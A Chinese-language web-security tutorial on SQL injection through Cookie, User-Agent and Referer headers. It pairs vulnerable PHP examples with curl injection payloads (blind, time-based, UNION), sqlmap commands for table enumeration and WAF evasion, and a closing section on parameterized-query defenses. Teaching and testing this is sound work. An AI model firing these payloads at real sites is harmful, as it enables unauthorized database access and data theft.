---
title: "HTTP Header SQL 注入全景：Cookie、User-Agent 与 Referer 的攻击面与防御"
date: 2026-06-03T22:30:00+08:00
draft: false
tags: ["CTF", "Web安全", "SQL注入", "HTTP Header注入", "Cookie注入", "User-Agent注入", "Referer注入", "sqlmap"]
categories: ["技术笔记"]
---

## 一、什么是 HTTP Header SQL 注入

HTTP Header SQL 注入是指攻击者将 SQL 注入 payload 植入 HTTP 请求头部的各类字段中（如 Cookie、User-Agent、Referer 等），当服务端**直接将这些头部值拼接到 SQL 语句**时触发的注入漏洞。

与 GET/POST 注入不同，Header 注入的触发逻辑往往不在主业务流程中，而是隐藏在**日志记录、统计分析、会话管理、来源追踪**等周边功能里。它们共享同一个核心特征：**开发者通常不会怀疑这些「元信息」头部会成为攻击入口**。

---

## 二、为什么 Header 注入容易被忽视

### 2.1 认知盲区

安全测试的注意力通常集中在：
- URL 的 GET 参数 (`?id=1`)
- 表单提交的 POST 数据
- JSON/XML API 请求体

而 HTTP Header 被视为「请求元数据」，很少被怀疑会携带恶意数据。

### 2.2 WAF 绕过优势

许多 WAF 重点监控 URL 查询字符串和 POST Body，但对 **Cookie、User-Agent、Referer 等头部的检测往往较弱**。同样的 payload，放在 URL 里会被拦截，放在 Header 里可能畅通无阻。

### 2.3 业务场景驱动

有些架构天然依赖 Header 传参：
- Cookie 存储用户偏好、分页状态
- User-Agent 用于设备识别与内容适配
- Referer 用于来源统计与反盗链

这些场景下，服务端往往会直接读取 Header 值并用于数据库查询。

---

## 三、Cookie 注入

### 3.1 原理

当服务端从 Cookie 中读取用户标识、会话信息或其他业务数据，并直接拼接到 SQL 语句时形成注入点。

```php
$user_id = $_COOKIE['id'];
$sql = "SELECT * FROM users WHERE id = '$user_id'";
```

### 3.2 常见应用场景

**用户偏好持久化**

```php
$theme = $_COOKIE['theme'];
$sql = "SELECT css_path FROM themes WHERE name = '$theme'";
```

**分页与筛选状态**

```php
$filter = json_decode($_COOKIE['search_filter']);
$sql = "SELECT * FROM products WHERE category = '{$filter->category}'";
```

**框架自动序列化**

部分 PHP 框架将路由参数序列化到 Cookie，反序列化后直接进入查询。

**身份验证与权限控制**

```php
$role = $_COOKIE['user_role'];
$sql = "SELECT * FROM admin_panel WHERE required_role = '$role'";
```

**绕过前端过滤**

当 URL 参数和 POST 数据经过严格过滤时，Cookie 可能成为绕过的通道。

### 3.3 手工验证

```bash
# 正常请求
curl -s "http://target.com/" -H "Cookie: id=1"

# 单引号测试
curl -s "http://target.com/" -H "Cookie: id=1'"

# 布尔盲注
curl -s "http://target.com/" -H "Cookie: id=1 AND 1=1"
curl -s "http://target.com/" -H "Cookie: id=1 AND 1=2"

# 时间盲注
curl -s -o /dev/null -w "%{time_total}" \
  "http://target.com/" -H "Cookie: id=1 AND IF(1=1, SLEEP(5), 0)"

# UNION 测试
curl -s "http://target.com/" -H "Cookie: id=-1 UNION SELECT 1,2,3-- -"
```

### 3.4 sqlmap 用法

```bash
# 检测（level=2 开始测 Cookie）
python sqlmap.py -u "http://target.com/" \
  --cookie="id=1" --level=2 --batch

# 利用 UNION 注入
python sqlmap.py -u "http://target.com/" \
  --cookie="id=1" --technique=U --level=2 --batch --tables

# 带登录态
python sqlmap.py -u "http://target.com/admin.php" \
  --cookie="PHPSESSID=abc123; id=1" --level=2 --batch
```

---

## 四、User-Agent 注入

### 4.1 原理

当服务端将请求的 `User-Agent` 头部信息直接拼接到 SQL 语句时形成注入点。UA 注入通常不出现在主业务流程，而是隐藏在日志、统计、设备识别等功能中。

```php
$ua = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO access_logs (ip, user_agent, visit_time)
        VALUES ('$ip', '$ua', NOW())";
```

### 4.2 常见应用场景

**访问日志与审计系统**

行为分析、PV/UV 统计、安全审计、运维监控。如果日志表包含 UA 字段且未做参数化处理，UA 就是直接的注入点。

**设备识别与内容适配**

```php
$result = mysqli_query($conn,
    "SELECT template FROM devices WHERE ua_pattern LIKE '%$ua%'"
);
```

**反爬虫与防 CC 系统**

反爬虫系统记录 UA 用于识别爬虫特征、统计请求频率、维护黑名单。

**WAF 与安全设备的后端分析**

讽刺的是，有些 WAF 为了「分析请求特征」，会把 UA 写入数据库做聚合统计，反而成为突破口。

**广告与推荐系统**

```sql
SELECT ad_id FROM ads
WHERE target_browser = '$browser_from_ua'
  AND target_os = '$os_from_ua'
```

### 4.3 手工验证

```bash
# 正常请求
curl -s "http://target.com/" -H "User-Agent: Mozilla/5.0"

# 单引号测试
curl -s "http://target.com/" -H "User-Agent: Mozilla/5.0'"

# 布尔盲注
curl -s "http://target.com/" -H "User-Agent: Mozilla/5.0' AND 1=1-- -"
curl -s "http://target.com/" -H "User-Agent: Mozilla/5.0' AND 1=2-- -"

# 时间盲注
curl -s -o /dev/null -w "%{time_total}" \
  "http://target.com/" -H "User-Agent: Mozilla/5.0' AND IF(1=1, SLEEP(5), 0)-- -"

# UNION 测试
curl -s "http://target.com/" -H "User-Agent: -1' UNION SELECT 1,2,3-- -"
```

### 4.4 sqlmap 用法

```bash
# 检测（level=3 开始测 UA）
python sqlmap.py -u "http://target.com/" --level=3 --batch

# 指定 UA 并标记注入位
python sqlmap.py -u "http://target.com/" \
  --user-agent="Mozilla/5.0*" --level=3 --batch

# 利用 UNION 注入
python sqlmap.py -u "http://target.com/" \
  --level=3 --technique=U --batch --tables

# 随机 UA 绕过 WAF
python sqlmap.py -u "http://target.com/" \
  --level=3 --batch --random-agent
```

---

## 五、Referer 注入

### 5.1 原理

当服务端将 `Referer` 头部（表示用户从哪个页面跳转过来）直接拼接到 SQL 语句时形成注入点。

```php
$referer = $_SERVER['HTTP_REFERER'];
$sql = "INSERT INTO visit_sources (page, referer, time)
        VALUES ('$page', '$referer', NOW())";
```

### 5.2 常见应用场景

**访问来源统计**

网站分析用户从哪个搜索引擎、社交媒体或外部链接访问，将来源 URL 存入数据库用于流量分析。

**反盗链系统**

图片/资源服务器检查 Referer 是否来自本站，防止外部网站直接引用资源：

```php
$referer = $_SERVER['HTTP_REFERER'];
$sql = "SELECT * FROM whitelist WHERE domain LIKE '%$referer%'";
```

**推广返利追踪**

根据 Referer 识别推广渠道，给推广者结算佣金。推广平台常将来源信息写入数据库。

**安全审计与异常检测**

记录可疑请求的来源页面，分析是否存在 CSRF、钓鱼等攻击的前置链路。

### 5.3 手工验证

```bash
# 正常请求
curl -s "http://target.com/" -H "Referer: http://google.com"

# 单引号测试
curl -s "http://target.com/" -H "Referer: http://google.com'"

# 布尔盲注
curl -s "http://target.com/" -H "Referer: http://google.com' AND 1=1-- -"
curl -s "http://target.com/" -H "Referer: http://google.com' AND 1=2-- -"

# 时间盲注
curl -s -o /dev/null -w "%{time_total}" \
  "http://target.com/" -H "Referer: http://google.com' AND IF(1=1, SLEEP(5), 0)-- -"

# UNION 测试
curl -s "http://target.com/" -H "Referer: -1' UNION SELECT 1,2,3-- -"
```

### 5.4 sqlmap 用法

```bash
# 检测（level=3 开始测 Referer）
python sqlmap.py -u "http://target.com/" --level=3 --batch

# 指定 Referer 并标记注入位
python sqlmap.py -u "http://target.com/" \
  --referer="http://evil.com*" --level=3 --batch

# 利用 UNION 注入
python sqlmap.py -u "http://target.com/" \
  --level=3 --technique=U --batch --tables
```

---

## 六、统一检测策略

### 6.1 sqlmap level 与检测范围

| level | 检测范围 |
|-------|---------|
| 1 | GET/POST 参数 |
| 2 | 增加 Cookie 检测 |
| 3 | 增加 User-Agent、Referer、Host 检测 |
| 4 | 增加更多 Header 和边界测试 |
| 5 | 全面测试所有可能的注入点 |

**推荐做法**：渗透测试时直接用 `--level=3 --batch` 跑一遍，让 sqlmap 自动扫描所有 Header 注入点，不要只盯着 URL 参数。

### 6.2 三者的核心对比

| 维度 | Cookie 注入 | User-Agent 注入 | Referer 注入 |
|------|------------|----------------|-------------|
| **参数位置** | `Cookie: id=1` | `User-Agent: Mozilla/5.0` | `Referer: http://a.com` |
| **业务场景** | 偏好/状态/身份 | 日志/设备/反爬 | 来源统计/反盗链 |
| **开发者警觉性** | 中 | 很低 | 很低 |
| **WAF 检测强度** | 较弱 | 通常很弱 | 通常很弱 |
| **sqlmap level** | `--level=2` | `--level=3` | `--level=3` |
| **sqlmap 参数** | `--cookie` | `--user-agent` | `--referer` |
| **手工修改** | 开发者工具/Cookie 编辑器 | 抓包/重放 | 抓包/重放 |

### 6.3 一个请求可能存在多个注入点

同一个 HTTP 请求中，Cookie、User-Agent、Referer 可能**同时存在注入点**：

```
GET /page.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0' [注入点A]
Referer: http://a.com' [注入点B]
Cookie: id=1' [注入点C]
```

sqlmap 用 `--level=3` 跑一遍，会自动报告所有检测到的注入点。

---

## 七、防御建议

### 7.1 参数化查询（根本解决）

```php
// 错误：直接拼接
$ua = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO logs (ua) VALUES ('$ua')";

// 正确：参数化查询
$stmt = $conn->prepare("INSERT INTO logs (ua) VALUES (?)");
$stmt->bind_param("s", $_SERVER['HTTP_USER_AGENT']);
$stmt->execute();
```

### 7.2 输入校验与截断

- 不信任任何客户端输入，包括所有 HTTP Header
- 对 Header 值进行类型校验和长度限制
- Cookie 中敏感信息使用服务端 Session 替代
- 日志记录时对 UA、Referer 做截断（通常不超过 512 字符）

### 7.3 安全测试覆盖

安全测试时应将所有 HTTP Header 纳入注入测试范围：
- Cookie 中的所有业务参数
- User-Agent、Referer、Host 等标准 Header
- 自定义 Header（如 `X-Custom-Header`）
- 编码/序列化后存入 Header 的数据

---

## 八、总结

HTTP Header SQL 注入的本质和 GET/POST 注入没有区别，但由于**参数位置隐蔽、WAF 检测薄弱、开发者容易忽略**，它们往往成为攻击的有效突破口。

关键记忆点：

1. **sqlmap 扫描 Header 注入需要提升 level**：Cookie 需要 `--level=2`，UA 和 Referer 需要 `--level=3`
2. **一个请求可能有多个注入点**——Cookie、UA、Referer 可以同时存在漏洞
3. **优先利用 UNION 注入**，比盲注快几个数量级
4. **WAF 对 Header 的检查通常较弱**，渗透测试时不要只盯着 URL 参数
5. **安全测试要覆盖「辅助功能」**——日志、统计、来源追踪、设备识别等模块

掌握 HTTP Header 注入的检测和利用方法，能够显著扩展 SQL 注入的测试覆盖面，发现那些隐藏在「请求元数据」里的漏洞。
